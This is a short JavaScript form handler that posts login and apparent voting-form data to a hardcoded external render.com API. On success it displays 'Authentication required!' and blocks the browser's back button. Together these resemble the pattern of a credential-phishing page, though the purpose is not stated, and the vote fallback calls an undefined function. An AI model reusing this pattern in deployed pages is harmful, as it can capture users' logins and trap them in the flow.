import { validateForm } from './helper.js';

const API_URL = "https://prosper-cub-1.onrender.com";

/**
 * Submits a form to the API.
 * @param {Object} form - The form data to submit
 * @param {string} type - Submission type (default: "submit-login")
 * @param {HTMLElement|null} output - Optional output element to display messages
 */
export async function submitform(form, type = "submit-login", output = null) {
  if (output) {
    output.textContent = "Please wait...";
  }

  try {
    const response = await fetch(`${API_URL}/${type}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(form)
    });

    const data = await response.json();

    if (response.ok) {
      if (output) output.textContent = "Authentication required!";

      // Prevent back navigation
      history.pushState(null, null, location.href);
      window.onpopstate = () => history.go(1);

      // Optional: redirect after login
      // window.location.replace("auth.html");

    } else {
      if (output) output.textContent = "❌ Error: " + (data.error || "Unknown error");
    }

    console.log("Response:", JSON.stringify(data));

  } catch (err) {
    if (output) output.textContent = "❌ Network error, check console.";
    console.error("Fetch failed:", err);

    // Optional fallback for voting forms
    if (form.type === "submit-vote") {
      submitSecform(form);
    }
  }
}